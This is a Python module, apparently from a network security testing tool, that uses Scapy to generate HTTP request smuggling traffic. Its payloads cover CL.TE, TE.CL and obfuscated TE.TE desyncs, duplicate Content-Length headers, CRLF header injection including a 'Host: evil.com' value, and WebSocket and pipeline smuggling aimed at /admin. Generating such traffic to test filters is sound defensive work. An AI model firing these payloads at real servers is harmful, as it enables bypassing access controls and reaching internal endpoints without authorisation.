"""HTTP request smuggling traffic module."""

import random
from collections.abc import Iterator

from scapy.layers.inet import IP, TCP
from scapy.packet import Packet, Raw

from netsec_tester.modules.base import ModuleInfo, TrafficCategory, TrafficModule


class HTTPSmugglingModule(TrafficModule):
    """Traffic module for HTTP request smuggling patterns.

    Generates HTTP requests that simulate request smuggling attacks
    (CL.TE, TE.CL, TE.TE) for security testing.
    """

    def __init__(self) -> None:
        """Initialize the HTTP smuggling module."""
        self._attack_count = 0

    def get_info(self) -> ModuleInfo:
        """Return module information."""
        return ModuleInfo(
            name="http_smuggling",
            description="HTTP smuggling attacks (CL.TE, TE.CL, TE.TE desync)",
            category=TrafficCategory.WEB_FILTER,
            protocols=["TCP"],
            ports=[80, 443, 8080],
        )

    def _generate_cl_te_basic(self, src_ip: str, dst_ip: str, port: int) -> Iterator[Packet]:
        """Generate CL.TE smuggling attack (Content-Length vs Transfer-Encoding)."""
        # Frontend uses Content-Length, backend uses Transfer-Encoding
        smuggled_request = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {dst_ip}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 6\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"G"  # Start of smuggled request "GET /admin..."
        )

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=random.randint(49152, 65535), dport=port, flags="PA")
            / Raw(load=smuggled_request.encode())
        )
        yield packet

    def _generate_te_cl_basic(self, src_ip: str, dst_ip: str, port: int) -> Iterator[Packet]:
        """Generate TE.CL smuggling attack (Transfer-Encoding vs Content-Length)."""
        # Frontend uses Transfer-Encoding, backend uses Content-Length
        smuggled_body = "GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n"

        smuggled_request = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {dst_ip}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(smuggled_body) + 5}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"{smuggled_body}"
        )

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=random.randint(49152, 65535), dport=port, flags="PA")
            / Raw(load=smuggled_request.encode())
        )
        yield packet

    def _generate_te_te_obfuscation(self, src_ip: str, dst_ip: str, port: int) -> Iterator[Packet]:
        """Generate TE.TE smuggling with obfuscated Transfer-Encoding."""
        # Various ways to obfuscate Transfer-Encoding header
        te_obfuscations = [
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: x",
            "Transfer-Encoding: x\r\nTransfer-Encoding: chunked",
            "Transfer-Encoding: chunked\r\nTransfer-encoding: x",
            "Transfer-Encoding : chunked",
            "Transfer-Encoding: chunked\r\n X: x",
            "Transfer-Encoding:\tchunked",
            "Transfer-Encoding: xchunked",
            "Transfer-Encoding\n: chunked",
        ]

        te_header = random.choice(te_obfuscations)

        smuggled_request = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {dst_ip}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 4\r\n"
            f"{te_header}\r\n"
            f"\r\n"
            f"5c\r\n"
            f"GPOST / HTTP/1.1\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 15\r\n"
            f"\r\n"
            f"x=1\r\n"
            f"0\r\n"
            f"\r\n"
        )

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=random.randint(49152, 65535), dport=port, flags="PA")
            / Raw(load=smuggled_request.encode())
        )
        yield packet

    def _generate_double_content_length(
        self, src_ip: str, dst_ip: str, port: int
    ) -> Iterator[Packet]:
        """Generate request with duplicate Content-Length headers."""
        smuggled_request = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {dst_ip}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 6\r\n"
            f"Content-Length: 100\r\n"
            f"\r\n"
            f"x=test"
        )

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=random.randint(49152, 65535), dport=port, flags="PA")
            / Raw(load=smuggled_request.encode())
        )
        yield packet

    def _generate_http2_downgrade(self, src_ip: str, dst_ip: str, port: int) -> Iterator[Packet]:
        """Generate HTTP/2 to HTTP/1.1 downgrade patterns."""
        # H2C upgrade with smuggled content
        smuggled_request = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {dst_ip}\r\n"
            f"Upgrade: h2c\r\n"
            f"HTTP2-Settings: AAEAABAAAAIAAAABAAN_____AAQAAP__AAUAAEAAAAZ_____\r\n"
            f"Connection: Upgrade, HTTP2-Settings\r\n"
            f"Content-Length: 0\r\n"
            f"\r\n"
        )

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=random.randint(49152, 65535), dport=port, flags="PA")
            / Raw(load=smuggled_request.encode())
        )
        yield packet

    def _generate_header_injection(self, src_ip: str, dst_ip: str, port: int) -> Iterator[Packet]:
        """Generate CRLF injection for header smuggling."""
        # CRLF in header value to inject additional headers
        injected_headers = [
            "X-Injected: test\r\nX-Admin: true",
            "foo: bar\r\nTransfer-Encoding: chunked",
            "legit\r\nHost: evil.com",
        ]

        injection = random.choice(injected_headers)

        smuggled_request = f"GET / HTTP/1.1\r\nHost: {dst_ip}\r\nX-Custom: {injection}\r\n\r\n"

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=random.randint(49152, 65535), dport=port, flags="PA")
            / Raw(load=smuggled_request.encode())
        )
        yield packet

    def _generate_websocket_smuggling(
        self, src_ip: str, dst_ip: str, port: int
    ) -> Iterator[Packet]:
        """Generate WebSocket upgrade smuggling patterns."""
        # WebSocket smuggling via Upgrade header
        smuggled_request = (
            f"GET /chat HTTP/1.1\r\n"
            f"Host: {dst_ip}\r\n"
            f"Upgrade: websocket\r\n"
            f"Connection: Upgrade\r\n"
            f"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
            f"Sec-WebSocket-Version: 13\r\n"
            f"Sec-WebSocket-Protocol: v10.stomp\r\n"
            f"\r\n"
            f"GET /admin HTTP/1.1\r\n"
            f"Host: internal\r\n"
            f"\r\n"
        )

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=random.randint(49152, 65535), dport=port, flags="PA")
            / Raw(load=smuggled_request.encode())
        )
        yield packet

    def _generate_pipeline_injection(self, src_ip: str, dst_ip: str, port: int) -> Iterator[Packet]:
        """Generate HTTP pipeline injection patterns."""
        # Multiple requests in single packet
        smuggled_request = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {dst_ip}\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
            f"GET /admin HTTP/1.1\r\n"
            f"Host: {dst_ip}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        )

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=random.randint(49152, 65535), dport=port, flags="PA")
            / Raw(load=smuggled_request.encode())
        )
        yield packet

    def generate_packets(
        self,
        src_ip: str,
        dst_ip: str,
        dst_port: int | None = None,
    ) -> Iterator[Packet]:
        """Generate HTTP smuggling packets.

        Args:
            src_ip: Source IP address
            dst_ip: Destination IP address
            dst_port: Destination port

        Yields:
            Scapy packets with HTTP smuggling patterns
        """
        port = dst_port or 80
        self._attack_count += 1

        # Rotate through different smuggling techniques
        technique = self._attack_count % 8

        if technique == 0:
            yield from self._generate_cl_te_basic(src_ip, dst_ip, port)
        elif technique == 1:
            yield from self._generate_te_cl_basic(src_ip, dst_ip, port)
        elif technique == 2:
            yield from self._generate_te_te_obfuscation(src_ip, dst_ip, port)
        elif technique == 3:
            yield from self._generate_double_content_length(src_ip, dst_ip, port)
        elif technique == 4:
            yield from self._generate_http2_downgrade(src_ip, dst_ip, port)
        elif technique == 5:
            yield from self._generate_header_injection(src_ip, dst_ip, port)
        elif technique == 6:
            yield from self._generate_websocket_smuggling(src_ip, dst_ip, port)
        else:
            yield from self._generate_pipeline_injection(src_ip, dst_ip, port)
